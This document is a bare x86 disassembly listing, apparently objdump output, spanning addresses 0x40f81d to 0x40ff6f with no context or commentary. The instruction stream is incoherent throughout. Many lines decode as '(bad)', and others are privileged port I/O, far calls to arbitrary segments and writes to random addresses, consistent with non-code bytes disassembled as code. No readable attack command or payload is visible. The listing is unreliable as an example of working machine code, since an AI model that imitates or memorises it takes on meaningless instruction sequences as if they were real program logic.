  40f81d:	mov    ecx,0xa7e77a8
  40f822:	into   
  40f823:	stc    
  40f824:	dec    edi
  40f825:	push   eax
  40f826:	adc    esp,ecx
  40f828:	mov    WORD PTR [eax+0x74a0d477],?
  40f82e:	add    ebx,DWORD PTR [ecx+0x38]
  40f831:	jp     0x40f7bf
  40f833:	pop    eax
  40f834:	out    0xd6,al
  40f836:	inc    esi
  40f837:	ret    0x284e
  40f83a:	in     al,dx
  40f83b:	add    eax,0xb1c1fe18
  40f840:	sahf   
  40f841:	mov    edx,0xfbcb7536
  40f846:	or     DWORD PTR [edi+eax*8],ebp
  40f849:	aad    0x11
  40f84b:	fimul  WORD PTR [ebp+0x142129da]
  40f851:	cmp    al,0x6
  40f853:	mov    ebx,DWORD PTR [edi+0x64e52619]
  40f859:	add    al,0x72
  40f85b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f85c:	sub    al,0x9
  40f85e:	(bad)  
  40f85f:	dec    esi
  40f860:	icebp  
  40f861:	dec    ebx
  40f862:	out    0xdc,eax
  40f864:	stos   DWORD PTR es:[edi],eax
  40f865:	mov    al,ds:0x8e19c703
  40f86a:	mov    ecx,DWORD PTR [eax+ecx*1-0x63]
  40f86e:	stos   DWORD PTR es:[edi],eax
  40f86f:	test   al,0x74
  40f871:	call   0x557a:0x9fda51b7
  40f878:	cmp    DWORD PTR [eax-0x1b],esp
  40f87b:	jmp    0x40f817
  40f87d:	into   
  40f87e:	inc    ebp
  40f87f:	sti    
  40f880:	ds jmp 0x40f884
  40f883:	nop
  40f884:	out    dx,eax
  40f885:	dec    eax
  40f886:	add    DWORD PTR [edi-0x5a],edi
  40f889:	outs   dx,DWORD PTR ds:[esi]
  40f88a:	addr16 in eax,0xcc
  40f88d:	mov    esp,esp
  40f88f:	xor    DWORD PTR [esi+0x2],0xffffff81
  40f893:	mov    ds:0xdcf95333,al
  40f898:	retf   0xc5a9
  40f89b:	inc    edi
  40f89c:	outs   dx,BYTE PTR ds:[esi]
  40f89d:	arpl   WORD PTR [ebp+0x7d],bp
  40f8a0:	sbb    DWORD PTR [ecx],edx
  40f8a2:	mov    ds:0x18443e28,eax
  40f8a7:	or     ah,BYTE PTR [edx-0x114773f1]
  40f8ad:	dec    ebx
  40f8ae:	mov    ds:0xe1e0b18e,eax
  40f8b3:	ds mov esp,0x63c75ae0
  40f8b9:	sbb    eax,0x71197220
  40f8be:	mov    al,0x1
  40f8c0:	xchg   edi,eax
  40f8c1:	je     0x40f934
  40f8c3:	fwait
  40f8c4:	adc    edx,DWORD PTR [edx-0x16]
  40f8c7:	pop    edi
  40f8c8:	call   0xf5f2:0x1515b1a1
  40f8cf:	dec    ecx
  40f8d0:	push   es
  40f8d1:	pop    edx
  40f8d2:	push   cs
  40f8d3:	(bad)  
  40f8d4:	pusha  
  40f8d5:	sub    ah,cl
  40f8d7:	add    ebp,ecx
  40f8d9:	mov    dl,0xe2
  40f8db:	dec    ecx
  40f8dc:	jns    0x40f8e4
  40f8de:	jge    0x40f884
  40f8e0:	pop    esi
  40f8e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8e2:	mov    bh,0xaa
  40f8e4:	or     ah,dh
  40f8e6:	or     eax,0x12978430
  40f8eb:	push   ds
  40f8ec:	or     cl,BYTE PTR [esi+0x8]
  40f8ef:	popf   
  40f8f0:	sub    al,0xc5
  40f8f2:	lock mov bh,0xb6
  40f8f5:	in     al,dx
  40f8f6:	mov    ds:0x3f42e904,eax
  40f8fb:	out    dx,eax
  40f8fc:	dec    edx
  40f8fd:	mul    BYTE PTR [ebp+0x3a]
  40f900:	jmp    0x6e41:0xfdb10c75
  40f907:	popa   
  40f908:	jl     0x40f931
  40f90a:	shl    DWORD PTR [eax+0x1d],cl
  40f90d:	cmp    ch,BYTE PTR [edi*8-0x85ea370]
  40f914:	push   es
  40f915:	xchg   edi,eax
  40f916:	push   ecx
  40f917:	neg    BYTE PTR [esi]
  40f919:	sbb    eax,0x1b2bcb90
  40f91e:	and    BYTE PTR [edi+ecx*4],cl
  40f921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f922:	fisubr WORD PTR [ecx+ebx*2]
  40f925:	mov    gs,WORD PTR [eax+0x580c92fe]
  40f92b:	pop    eax
  40f92c:	sub    ecx,DWORD PTR [edx]
  40f92e:	cmp    bh,BYTE PTR [esi+0x3e]
  40f931:	pop    esp
  40f932:	pop    ebx
  40f933:	gs and ecx,edx
  40f936:	xor    eax,0x88d79b1
  40f93b:	fs mov edi,0x924e94fe
  40f941:	push   ebx
  40f942:	inc    esp
  40f943:	fsub   DWORD PTR [edx+0x14507dbd]
  40f949:	dec    eax
  40f94a:	int    0x4c
  40f94c:	(bad)  
  40f94d:	daa    
  40f94e:	push   es
  40f94f:	pusha  
  40f950:	icebp  
  40f951:	iret   
  40f952:	fs iret 
  40f954:	sahf   
  40f955:	adc    edi,DWORD PTR [edx-0x116ab066]
  40f95b:	ja     0x40f989
  40f95d:	or     al,al
  40f95f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f960:	mov    cl,BYTE PTR [ebx-0x19cbaac9]
  40f966:	add    DWORD PTR [eax],ebx
  40f968:	pop    ecx
  40f969:	cmp    BYTE PTR [esi+0x2e],ch
  40f96c:	lahf   
  40f96d:	xor    DWORD PTR [ecx-0x714af6e5],esi
  40f973:	clc    
  40f974:	adc    eax,0xa2f4f38d
  40f979:	or     eax,0xb65c0323
  40f97e:	loope  0x40f96c
  40f980:	out    0x35,al
  40f982:	in     eax,0x3d
  40f984:	(bad)  
  40f985:	sahf   
  40f986:	lea    eax,[ebp+0x20]
  40f989:	adc    al,0xb3
  40f98b:	out    dx,al
  40f98c:	fst    st(1)
  40f98e:	ds ret 0x8f79
  40f992:	cmp    ah,BYTE PTR [edi+ebp*2-0x575be6cd]
  40f999:	lods   al,BYTE PTR ds:[esi]
  40f99a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f99b:	xor    eax,0x3d12edfb
  40f9a0:	jle    0x40f994
  40f9a2:	mov    edx,0xaa2bea9
  40f9a7:	sub    DWORD PTR [eax],edx
  40f9a9:	push   ecx
  40f9aa:	xchg   bl,cl
  40f9ac:	adc    DWORD PTR [esi+0x58f7889f],0xca58a252
  40f9b6:	xchg   edi,eax
  40f9b7:	jnp    0x40f9e9
  40f9b9:	ins    BYTE PTR es:[edi],dx
  40f9ba:	inc    esp
  40f9bb:	int    0x25
  40f9bd:	fdiv   QWORD PTR [ebp-0x21c248f]
  40f9c3:	jle    0x40f9c2
  40f9c5:	sub    edx,DWORD PTR [edx-0x74]
  40f9c8:	test   DWORD PTR [ebx],0x277a2ce1
  40f9ce:	stos   BYTE PTR es:[edi],al
  40f9cf:	and    al,0x75
  40f9d1:	idiv   BYTE PTR [eax]
  40f9d3:	outs   dx,DWORD PTR ds:[esi]
  40f9d4:	repnz push eax
  40f9d6:	mov    ds:0xb2bfbf34,eax
  40f9db:	lahf   
  40f9dc:	dec    ecx
  40f9dd:	adc    BYTE PTR [edx+0x3c],0xe3
  40f9e1:	jnp    0x40fa13
  40f9e3:	(bad)  
  40f9e4:	test   eax,0x15b9514c
  40f9e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ea:	push   ss
  40f9eb:	scas   eax,DWORD PTR es:[edi]
  40f9ec:	cli    
  40f9ed:	ficom  DWORD PTR [edi-0x84497f7]
  40f9f3:	mov    al,0x11
  40f9f5:	pop    esi
  40f9f6:	xor    eax,0xfd035290
  40f9fb:	(bad)  
  40f9fc:	retf   0x2f21
  40f9ff:	in     al,dx
  40fa00:	pop    ebx
  40fa01:	pop    esp
  40fa02:	xchg   edi,eax
  40fa03:	push   0x42514fe7
  40fa08:	loope  0x40fa30
  40fa0a:	imul   esi,edx,0x19
  40fa0d:	mov    DWORD PTR [ebp+0x38],esp
  40fa10:	cmp    ebx,DWORD PTR [ebp-0x70]
  40fa13:	pop    edi
  40fa14:	mov    DWORD PTR [esi-0x26],esi
  40fa17:	mov    BYTE PTR [edx+0x73],ah
  40fa1a:	xor    DWORD PTR [ecx-0x22],0xffffffcc
  40fa1e:	cdq    
  40fa1f:	mov    WORD PTR [edx],?
  40fa21:	adc    eax,DWORD PTR [ebp+0x73bff8c3]
  40fa27:	mov    ds:0xa08e211e,al
  40fa2c:	xor    DWORD PTR [ecx+0x6],edx
  40fa2f:	jae    0x40fa96
  40fa31:	dec    ebx
  40fa32:	div    BYTE PTR [ebx-0x78]
  40fa35:	and    al,0x17
  40fa37:	pop    ds
  40fa38:	mov    edx,0xae157cc8
  40fa3d:	out    0x4b,eax
  40fa3f:	jns    0x40f9d6
  40fa41:	stc    
  40fa42:	mov    ds:0x81b9c72a,al
  40fa47:	cs ja  0x40fa81
  40fa4a:	(bad)  
  40fa4b:	sbb    al,0x8c
  40fa4d:	aas    
  40fa4e:	xchg   BYTE PTR [edx+ebx*8-0x1ec44aff],ah
  40fa55:	fbld   TBYTE PTR [edi-0x17]
  40fa58:	ror    BYTE PTR [esi+esi*4+0xa05bee1],cl
  40fa5f:	xchg   esi,eax
  40fa60:	(bad)
  40fa63:	fistp  QWORD PTR [esi]
  40fa65:	jae    0x40fa3f
  40fa67:	test   eax,0x956f46e6
  40fa6c:	icebp  
  40fa6d:	aas    
  40fa6e:	pop    ecx
  40fa6f:	sar    DWORD PTR [eax+0x38],0xa8
  40fa73:	inc    esp
  40fa74:	jo     0x40fa18
  40fa76:	jg     0x40fae5
  40fa78:	inc    ecx
  40fa79:	cmc    
  40fa7a:	mov    ch,0x5f
  40fa7c:	test   al,0xec
  40fa7e:	jp     0x40fa66
  40fa80:	xor    eax,0xbcd5c3e6
  40fa85:	cmp    BYTE PTR [ecx-0x40ff99e1],cl
  40fa8b:	mov    WORD PTR [eax],gs
  40fa8d:	stos   BYTE PTR es:[edi],al
  40fa8e:	mov    al,ds:0x6756e010
  40fa93:	push   esi
  40fa94:	(bad)  
  40fa95:	pop    eax
  40fa96:	shl    DWORD PTR [edx],cl
  40fa98:	mov    eax,0x7d942107
  40fa9d:	xchg   edi,eax
  40fa9e:	push   edi
  40fa9f:	mov    dh,0xe7
  40faa1:	sub    ebp,DWORD PTR [esi]
  40faa3:	je     0x40fa31
  40faa5:	dec    edx
  40faa6:	test   ecx,edi
  40faa8:	pop    ebx
  40faa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40faaa:	hlt    
  40faab:	outs   dx,DWORD PTR ds:[esi]
  40faac:	mov    ds:0x86a2193e,al
  40fab1:	iret   
  40fab2:	ret    0xec40
  40fab5:	dec    bh
  40fab7:	adc    al,0x39
  40fab9:	ins    DWORD PTR es:[edi],dx
  40faba:	loope  0x40fac5
  40fabc:	or     DWORD PTR [eax+0x70],esi
  40fabf:	aam    0x88
  40fac1:	js     0x40fb2e
  40fac3:	add    al,BYTE PTR [ebp+0x282741bf]
  40fac9:	mov    ds:0x48816fd5,eax
  40face:	cmp    bl,al
  40fad0:	dec    ebx
  40fad1:	cli    
  40fad2:	mov    esp,0xd15a7d25
  40fad7:	clc    
  40fad8:	dec    ecx
  40fad9:	into   
  40fada:	out    0x8a,eax
  40fadc:	test   eax,0x65f70864
  40fae1:	pop    ecx
  40fae2:	(bad)  [edi-0x17df262c]
  40fae8:	retf   
  40fae9:	das    
  40faea:	icebp  
  40faeb:	add    ah,BYTE PTR [ecx-0x58]
  40faee:	jae    0x40fa78
  40faf0:	cld    
  40faf1:	out    dx,eax
  40faf2:	retf   
  40faf3:	sti    
  40faf4:	mov    cl,bl
  40faf6:	mov    esi,0x27dd83b5
  40fafb:	mov    BYTE PTR [eax+0x5d498ffd],bl
  40fb01:	stos   DWORD PTR es:[edi],eax
  40fb02:	mov    ecx,0x9ac5c7c7
  40fb07:	(bad)  
  40fb08:	xor    dl,BYTE PTR [edx+eax*4+0x78]
  40fb0c:	sbb    ecx,ecx
  40fb0e:	adc    al,0xc9
  40fb10:	aas    
  40fb11:	aam    0xa3
  40fb13:	rcl    BYTE PTR [esi-0x56a4eb0d],1
  40fb19:	push   edi
  40fb1a:	jae    0x40fb3b
  40fb1c:	repz inc edi
  40fb1e:	aad    0x15
  40fb20:	repnz dec ebx
  40fb22:	in     al,dx
  40fb23:	sub    BYTE PTR [edi+esi*4-0x5d],ch
  40fb27:	mov    ecx,0x5f443d59
  40fb2c:	pop    es
  40fb2d:	fidivr WORD PTR [ebx]
  40fb2f:	loope  0x40fb7e
  40fb31:	jmp    0x40fac6
  40fb33:	pop    edx
  40fb34:	jl     0x40fba6
  40fb36:	adc    al,0xf8
  40fb38:	xchg   ecx,eax
  40fb39:	ret    
  40fb3a:	jg     0x40fac6
  40fb3c:	fdiv   QWORD PTR [edx+0x16]
  40fb3f:	xchg   DWORD PTR [edx],ebx
  40fb41:	mov    ebx,cs
  40fb43:	ins    DWORD PTR es:[edi],dx
  40fb44:	or     dh,al
  40fb46:	or     al,0x32
  40fb48:	dec    edx
  40fb49:	not    ecx
  40fb4b:	pop    ecx
  40fb4c:	pop    ss
  40fb4d:	or     esp,DWORD PTR [edx]
  40fb4f:	daa    
  40fb50:	daa    
  40fb51:	inc    ebx
  40fb52:	sub    edx,DWORD PTR ds:0x31721cb6
  40fb58:	xlat   BYTE PTR ds:[ebx]
  40fb59:	pop    esi
  40fb5a:	jg     0x40fbc2
  40fb5c:	es cs and eax,0x1341bfda
  40fb63:	iret   
  40fb64:	dec    si
  40fb66:	add    eax,0xa3a67c4a
  40fb6b:	jge    0x40fb04
  40fb6d:	stc    
  40fb6e:	pusha  
  40fb6f:	leave  
  40fb70:	stc    
  40fb71:	imul   ecx,DWORD PTR [eax+0x25],0xd9d4f9e5
  40fb78:	cmp    eax,0xd37aba43
  40fb7d:	pop    esp
  40fb7e:	mov    eax,ds:0x53378327
  40fb83:	cdq    
  40fb84:	repnz les ebp,FWORD PTR [esi-0x2b]
  40fb88:	add    eax,0xa6390d20
  40fb8d:	mov    edx,0x816531ea
  40fb92:	jp     0x40fbea
  40fb94:	int    0x49
  40fb96:	nop
  40fb97:	adc    bl,BYTE PTR [ecx*2+0x61d39a67]
  40fb9e:	es ins BYTE PTR es:[edi],dx
  40fba0:	lods   eax,DWORD PTR ds:[esi]
  40fba1:	jle    0x40fb54
  40fba3:	jb     0x40fbd3
  40fba5:	sti    
  40fba6:	cdq    
  40fba7:	and    BYTE PTR [ebp+0x64],0x91
  40fbab:	sbb    DWORD PTR [eax+0x6a],edx
  40fbae:	jbe    0x40fb8a
  40fbb0:	sub    ch,al
  40fbb2:	gs rcl dl,1
  40fbb5:	stos   DWORD PTR es:[edi],eax
  40fbb6:	ds loop 0x40fb4d
  40fbb9:	repz mov ss,WORD PTR [ebp+0x2f]
  40fbbd:	into   
  40fbbe:	add    DWORD PTR [edi-0xd],ebx
  40fbc1:	sub    eax,0x1ca696de
  40fbc6:	add    bh,dl
  40fbc8:	punpckhbw mm4,QWORD PTR [edi-0xce13a3a]
  40fbcf:	inc    esi
  40fbd0:	cmp    ebp,DWORD PTR [ebx+0xcb64153]
  40fbd6:	xor    dl,BYTE PTR [ecx-0x50f7d7ec]
  40fbdc:	lock xchg bh,bh
  40fbdf:	push   ecx
  40fbe0:	or     edx,DWORD PTR [edi+0x73]
  40fbe3:	fdiv   QWORD PTR [eax+eiz*2-0x1d]
  40fbe7:	push   edi
  40fbe8:	push   ds
  40fbe9:	imul   ecx,DWORD PTR [ecx-0x4c],0x7d
  40fbed:	pop    esp
  40fbee:	mov    dl,BYTE PTR [edx]
  40fbf0:	iret   
  40fbf1:	leave  
  40fbf2:	cmp    DWORD PTR [esi],esp
  40fbf4:	scas   eax,DWORD PTR es:[edi]
  40fbf5:	cmp    bh,dh
  40fbf7:	push   esp
  40fbf8:	inc    ecx
  40fbf9:	sbb    eax,0x97dfcb39
  40fbfe:	adc    ebp,DWORD PTR [eax]
  40fc00:	stos   DWORD PTR es:[edi],eax
  40fc01:	and    DWORD PTR [ecx+0x45],esi
  40fc04:	sbb    eax,0x905ec7ff
  40fc09:	mov    al,0x40
  40fc0b:	test   DWORD PTR [esi+0x7b],ebx
  40fc0e:	push   0x1f
  40fc10:	or     ebp,edi
  40fc12:	dec    edi
  40fc13:	pop    edx
  40fc14:	jmp    0x2e10241a
  40fc19:	shl    DWORD PTR [eax-0x5b7b1479],1
  40fc1f:	sub    BYTE PTR [ecx],dh
  40fc21:	(bad)  
  40fc22:	popa   
  40fc23:	xchg   esi,eax
  40fc24:	pop    ebp
  40fc25:	cli    
  40fc26:	cmp    eax,0x1862dc35
  40fc2b:	mov    ?,WORD PTR [edi]
  40fc2d:	jo     0x40fc49
  40fc2f:	mov    ds:0x9675cd70,al
  40fc34:	fs cli 
  40fc36:	inc    ecx
  40fc37:	mov    ch,0x37
  40fc39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc3a:	dec    edi
  40fc3b:	arpl   WORD PTR [ebx-0x6d89b9c7],cx
  40fc41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc42:	cs jmp 0x40fc00
  40fc45:	cmp    DWORD PTR [ebp+0x46],0x3
  40fc49:	mov    dh,0xc8
  40fc4b:	dec    esp
  40fc4c:	inc    ecx
  40fc4d:	rol    DWORD PTR [ebp-0x45],cl
  40fc50:	add    DWORD PTR [ecx-0x1093c3fc],0xffffffc2
  40fc57:	call   esi
  40fc59:	ds cmp eax,0x3f1764ee
  40fc5f:	add    DWORD PTR [ebx-0x6f],edi
  40fc62:	lock loopne 0x40fc0d
  40fc65:	jbe    0x40fbf8
  40fc67:	or     dl,cl
  40fc69:	jbe    0x40fc34
  40fc6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc6c:	xchg   edi,eax
  40fc6d:	mov    ch,0x3f
  40fc6f:	sub    DWORD PTR [ebx-0x45],ebp
  40fc72:	or     cl,dh
  40fc74:	mov    ch,0x37
  40fc76:	int3   
  40fc77:	mov    DWORD PTR [ebx+0x1a7c9b47],eax
  40fc7d:	adc    al,0xfb
  40fc7f:	xchg   ebp,eax
  40fc80:	ss jmp 0xd6b2:0x5093a1d5
  40fc88:	and    al,0xde
  40fc8a:	imul   edi,DWORD PTR [ebp+0x4],0xffffff9e
  40fc8e:	cs jo  0x40fce8
  40fc91:	push   edx
  40fc92:	fdivrp st(0),st
  40fc94:	mov    edi,0xf92e2f2b
  40fc99:	test   al,0x14
  40fc9b:	test   DWORD PTR [esi+0x50],edx
  40fc9e:	cs call esi
  40fca1:	(bad)  
  40fca2:	adc    bh,ch
  40fca4:	sub    eax,0x48b13727
  40fca9:	push   ds
  40fcaa:	mov    eax,0xadfed014
  40fcaf:	pop    es
  40fcb0:	mov    esp,0x4a96d3d
  40fcb5:	push   0x4cff385a
  40fcba:	in     eax,dx
  40fcbb:	or     DWORD PTR [ebp+0x4bf7c1f],ecx
  40fcc1:	push   ss
  40fcc2:	pop    ds
  40fcc3:	int    0x7c
  40fcc5:	add    eax,0xef946709
  40fcca:	int    0xc0
  40fccc:	sub    cl,BYTE PTR [ecx+0x55]
  40fccf:	sub    eax,0x97f7e91e
  40fcd4:	cli    
  40fcd5:	inc    DWORD PTR ds:0xa91c911d
  40fcdb:	push   0xaedeacca
  40fce0:	dec    ebp
  40fce1:	ficomp DWORD PTR [esi-0x16e52e55]
  40fce7:	xchg   ebx,eax
  40fce8:	or     al,0xe5
  40fcea:	xor    esi,ecx
  40fcec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fced:	jnp    0x40fcf8
  40fcef:	data16 test cl,0x66
  40fcf3:	push   edx
  40fcf4:	ins    BYTE PTR es:[edi],dx
  40fcf5:	and    esi,DWORD PTR [ebx]
  40fcf7:	mov    eax,0x3fe6782c
  40fcfc:	daa    
  40fcfd:	xor    BYTE PTR [eax+eax*8+0x58dbab1e],ch
  40fd04:	int    0x3b
  40fd06:	cmp    eax,0x560487a
  40fd0b:	js     0x40fced
  40fd0d:	addr16 (bad) 
  40fd0f:	xor    DWORD PTR [ecx-0xe799bcf],ebx
  40fd15:	and    edx,0x27
  40fd18:	push   esi
  40fd19:	repnz pop ds
  40fd1b:	sahf   
  40fd1c:	and    dl,BYTE PTR [ecx]
  40fd1e:	push   edi
  40fd1f:	in     al,0xe7
  40fd21:	nop
  40fd22:	(bad)  
  40fd23:	push   ss
  40fd24:	mov    al,0xe8
  40fd26:	add    ecx,esi
  40fd28:	push   ss
  40fd29:	aas    
  40fd2a:	test   DWORD PTR [edi+ebx*2+0x4fe8e817],ebx
  40fd31:	ds mov sp,0x72b
  40fd36:	cs pop eax
  40fd38:	lea    ebp,[esi-0x7b]
  40fd3b:	or     DWORD PTR [ebx+ecx*4],esp
  40fd3e:	test   DWORD PTR [ebp+0x71],ebp
  40fd41:	dec    esi
  40fd42:	push   eax
  40fd43:	jns    0x40fd66
  40fd45:	inc    ebp
  40fd46:	or     eax,0x379b1379
  40fd4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd4c:	retf   
  40fd4d:	lock sbb DWORD PTR [esi+0x1a8ba81b],ecx
  40fd54:	retf   
  40fd55:	xor    BYTE PTR [edi+0x31341a58],al
  40fd5b:	mov    WORD PTR [ebx-0x27ed26ed],ds
  40fd61:	push   edx
  40fd62:	mov    edx,fs
  40fd64:	xchg   ecx,eax
  40fd65:	sub    DWORD PTR [edi-0x55],0x69
  40fd69:	imul   edi,DWORD PTR [ecx+ebx*4+0x6c],0xc0a31e24
  40fd71:	pop    esi
  40fd72:	pop    eax
  40fd73:	push   esp
  40fd74:	mov    bh,0xcb
  40fd76:	fisttp DWORD PTR [ebx+edi*2]
  40fd79:	and    al,0x36
  40fd7b:	xchg   edx,eax
  40fd7c:	in     eax,0xec
  40fd7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd7f:	popf   
  40fd80:	gs in  eax,0xe5
  40fd83:	xchg   edx,eax
  40fd84:	out    0x91,al
  40fd86:	pop    es
  40fd87:	and    ah,ah
  40fd89:	repz xchg ebp,eax
  40fd8b:	imul   ecx,edi,0x5215a162
  40fd91:	sar    BYTE PTR [ecx-0x22],1
  40fd94:	pop    ecx
  40fd95:	in     al,dx
  40fd96:	mov    ebx,0x58f8a1d
  40fd9b:	dec    esp
  40fd9c:	into   
  40fd9d:	xlat   BYTE PTR ds:[ebx]
  40fd9e:	and    cl,dh
  40fda0:	sub    ebx,edx
  40fda2:	and    esp,edi
  40fda4:	cmc    
  40fda5:	jle    0x40fd31
  40fda7:	and    BYTE PTR [eax+esi*2-0x6e],ah
  40fdab:	mov    al,0x6b
  40fdad:	push   es
  40fdae:	stc    
  40fdaf:	push   esi
  40fdb0:	jae    0x40fd97
  40fdb2:	push   edi
  40fdb3:	jnp    0x40fd72
  40fdb5:	dec    edx
  40fdb6:	xor    edx,DWORD PTR [eax]
  40fdb8:	or     eax,0xf0d38222
  40fdbd:	aam    0xb6
  40fdbf:	in     eax,dx
  40fdc0:	ret    
  40fdc1:	ficomp DWORD PTR [edx-0x35]
  40fdc4:	ficomp WORD PTR [edi+0x50]
  40fdc7:	push   ebp
  40fdc8:	and    esp,edi
  40fdca:	jnp    0x40fd4e
  40fdcc:	inc    eax
  40fdcd:	neg    bh
  40fdcf:	mov    ds,WORD PTR [edx-0x77dff0f]
  40fdd5:	lods   al,BYTE PTR ds:[esi]
  40fdd6:	jecxz  0x40fe42
  40fdd8:	sbb    al,BYTE PTR [edx]
  40fdda:	jbe    0x40fe03
  40fddc:	leave  
  40fddd:	adc    esi,DWORD PTR ds:0x7aa273a4
  40fde3:	add    dl,BYTE PTR [ebx]
  40fde5:	stos   BYTE PTR es:[edi],al
  40fde6:	test   al,0xc3
  40fde8:	int    0xc7
  40fdea:	xchg   ebp,eax
  40fdeb:	jmp    0x20287114
  40fdf0:	out    dx,eax
  40fdf1:	ficom  WORD PTR [eax+eax*4]
  40fdf4:	and    DWORD PTR [ebp+0x4],edx
  40fdf7:	inc    ebx
  40fdf8:	add    eax,0x98b86e43
  40fdfd:	stc    
  40fdfe:	jb     0x40fdee
  40fe00:	jbe    0x40fe3e
  40fe02:	jmp    DWORD PTR ds:0x4165fc73
  40fe08:	pushf  
  40fe09:	jp     0x40fe2f
  40fe0b:	bound  esp,QWORD PTR [ebx-0x48d10cb9]
  40fe11:	cmc    
  40fe12:	sub    DWORD PTR ds:0xa5e6b8fe,edx
  40fe18:	jno    0x40fdac
  40fe1a:	xor    BYTE PTR [ebx-0x9],dh
  40fe1d:	loop   0x40fde5
  40fe1f:	in     al,dx
  40fe20:	outs   dx,BYTE PTR ds:[esi]
  40fe21:	cwde   
  40fe22:	fstp   DWORD PTR [ecx+0x57]
  40fe25:	and    esi,DWORD PTR [ebx-0x4a]
  40fe28:	jmp    0x72d465c3
  40fe2d:	or     bl,BYTE PTR ds:0xc9533a17
  40fe33:	sbb    al,ah
  40fe35:	pop    ss
  40fe36:	ins    BYTE PTR es:[edi],dx
  40fe37:	sbb    cl,BYTE PTR [edx+edx*8]
  40fe3a:	push   eax
  40fe3b:	es xor esp,0x35a98c50
  40fe42:	lods   eax,DWORD PTR ds:[esi]
  40fe43:	and    dl,cl
  40fe45:	xor    ch,dh
  40fe47:	adc    esp,DWORD PTR [esi-0x6a]
  40fe4a:	das    
  40fe4b:	push   0xf8611310
  40fe50:	test   bh,dl
  40fe52:	data16 loopne 0x40fdf6
  40fe55:	add    bh,BYTE PTR [edx]
  40fe57:	cmp    dh,BYTE PTR [ebp+0x7238157c]
  40fe5d:	mov    esi,0x9c731fa8
  40fe62:	jb     0x40fe4f
  40fe64:	retf   0xeb19
  40fe67:	repz lahf 
  40fe69:	cmp    BYTE PTR [ecx],al
  40fe6b:	popf   
  40fe6c:	inc    eax
  40fe6d:	add    al,0x8a
  40fe6f:	(bad)  [ecx+edi*4-0x6f]
  40fe73:	xlat   BYTE PTR ds:[ebx]
  40fe74:	pop    ebp
  40fe75:	dec    esi
  40fe76:	add    eax,DWORD PTR [ebx]
  40fe78:	adc    dl,BYTE PTR [edx+0x1d]
  40fe7b:	ins    BYTE PTR es:[edi],dx
  40fe7c:	nop
  40fe7d:	and    BYTE PTR [ebp+0x1d],bh
  40fe80:	or     dh,bh
  40fe82:	int3   
  40fe83:	add    eax,0xe5138567
  40fe88:	xchg   ecx,eax
  40fe89:	fwait
  40fe8a:	push   eax
  40fe8b:	add    dh,bl
  40fe8d:	mov    ds:0x2bd3ff58,eax
  40fe92:	inc    ecx
  40fe93:	inc    edi
  40fe94:	mov    ds:0x7bacd4b2,eax
  40fe99:	retf   
  40fe9a:	xchg   esi,eax
  40fe9b:	mov    ah,0xb3
  40fe9d:	push   esp
  40fe9e:	pop    sp
  40fea0:	or     BYTE PTR [edi],al
  40fea2:	mov    WORD PTR [edx-0x15],ss
  40fea5:	xchg   edx,eax
  40fea6:	mov    ch,0xad
  40fea8:	xchg   dl,dl
  40feaa:	mul    DWORD PTR [eax+0x44313378]
  40feb0:	rcl    cl,0x84
  40feb3:	fiadd  WORD PTR [ebx]
  40feb5:	imul   ebx,DWORD PTR [ecx],0xffffffe1
  40feb8:	inc    edi
  40feb9:	sar    BYTE PTR [ebx+0x69],1
  40febc:	cld    
  40febd:	and    ebx,DWORD PTR [ecx-0x6c2a6aaf]
  40fec3:	or     eax,0xac89e0b
  40fec8:	dec    esi
  40fec9:	mov    eax,0x84238847
  40fece:	sbb    al,al
  40fed0:	cwde   
  40fed1:	add    eax,0x140a0fca
  40fed6:	lods   eax,DWORD PTR ds:[esi]
  40fed7:	mov    ebx,0x689be8c4
  40fedc:	mov    ds:0x19b7c878,eax
  40fee1:	dec    ecx
  40fee2:	daa    
  40fee3:	imul   eax,DWORD PTR [edx],0xffffffd1
  40fee6:	and    DWORD PTR [ebx+ecx*8],edx
  40fee9:	imul   esp,DWORD PTR [edi-0x448acd61],0x7576a526
  40fef3:	enter  0x4569,0x1d
  40fef7:	call   DWORD PTR [ecx+0x4c]
  40fefa:	or     BYTE PTR [esi-0x49c51b71],bh
  40ff00:	pop    es
  40ff01:	sub    DWORD PTR [edi],eax
  40ff03:	and    al,0x93
  40ff05:	(bad)  
  40ff07:	inc    ecx
  40ff08:	adc    BYTE PTR [ebp-0x55],ah
  40ff0b:	cmp    eax,0xe73d8e19
  40ff10:	lea    esi,[edx-0x1c]
  40ff13:	retf   
  40ff14:	ins    DWORD PTR es:[edi],dx
  40ff15:	mov    ch,0xf
  40ff17:	pop    esi
  40ff18:	mov    bh,0xfa
  40ff1a:	call   0xee60:0xdead1512
  40ff21:	jmp    0x2451:0xc93f0940
  40ff28:	add    al,0x43
  40ff2a:	xor    dl,BYTE PTR [ebx+0x11ec8e63]
  40ff30:	pop    eax
  40ff31:	add    edi,edx
  40ff33:	xchg   DWORD PTR [edx-0x10],esp
  40ff36:	arpl   sp,bp
  40ff38:	pop    esi
  40ff39:	xor    al,0x2b
  40ff3b:	das    
  40ff3c:	xchg   cl,al
  40ff3e:	xabort 0x45
  40ff41:	sti    
  40ff42:	mov    ebp,0x128ba301
  40ff47:	fisubr WORD PTR [ebx+0x10]
  40ff4a:	xchg   edx,eax
  40ff4b:	pop    eax
  40ff4c:	loope  0x40ff06
  40ff4e:	sbb    BYTE PTR [edi+0x243b1262],0x41
  40ff55:	mov    ebp,0x4638b10a
  40ff5a:	cmp    DWORD PTR [ecx+0x3a02c642],0xd14d35fd
  40ff64:	repnz mov edi,0x7d7099f6
  40ff6a:	fwait
  40ff6b:	popa   
  40ff6c:	dec    edx
  40ff6d:	or     ch,BYTE PTR [ebx]
  40ff6f:	mul    BYTE PTR [ebp-0x2736a173]
